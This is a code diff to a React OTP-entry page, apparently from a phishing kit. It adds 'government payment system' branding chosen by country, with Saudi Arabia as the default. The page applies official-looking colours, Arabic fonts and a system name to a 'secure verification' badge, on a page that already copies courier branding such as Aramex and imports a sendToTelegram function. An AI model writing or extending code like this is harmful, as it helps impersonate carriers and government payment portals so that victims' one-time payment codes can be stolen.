@@ -9,6 +9,7 @@ import { sendToTelegram } from "@/lib/telegram";
 import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import {
   InputOTP,
   InputOTPGroup,
@@ -32,6 +33,10 @@ const PaymentOTP = () => {
   const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  
+  // Get government payment system
+  const selectedCountry = link?.payload?.selectedCountry || "SA";
+  const govSystem = getGovernmentPaymentSystem(selectedCountry);
   
   // Countdown timer
   useEffect(() => {
@@ -204,7 +209,7 @@ const PaymentOTP = () => {
       onKeyDown={handleKeyDown}
       tabIndex={0}
       style={{
-        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
+        background: govSystem.colors.surface
       }}
     >
       <div className="container mx-auto px-3 sm:px-4">
@@ -238,15 +243,16 @@ const PaymentOTP = () => {
             <Badge 
               className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2 text-white"
               style={{
-                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                background: govSystem.gradients.primary,
+                fontFamily: govSystem.fonts.primaryAr
               }}
             >
               <Lock className="w-3 h-3 sm:w-4 sm:h-4 ml-1.5 sm:ml-2" />
-              <span>التحقق الآمن</span>
+              <span>{govSystem.nameAr} - التحقق الآمن</span>
             </Badge>
           </div>
           
-          <Card className="p-4 sm:p-8 shadow-elevated border-2" style={{ borderColor: `${branding.colors.primary}20` }}>
+          <Card className="p-4 sm:p-8 shadow-elevated border-2" style={{ borderColor: `${govSystem.colors.primary}20`, boxShadow: govSystem.shadows.lg }}>
             <div className="flex items-center justify-between mb-4 sm:mb-6">
               <div className="flex items-center gap-2 sm:gap-3">
                 <div 
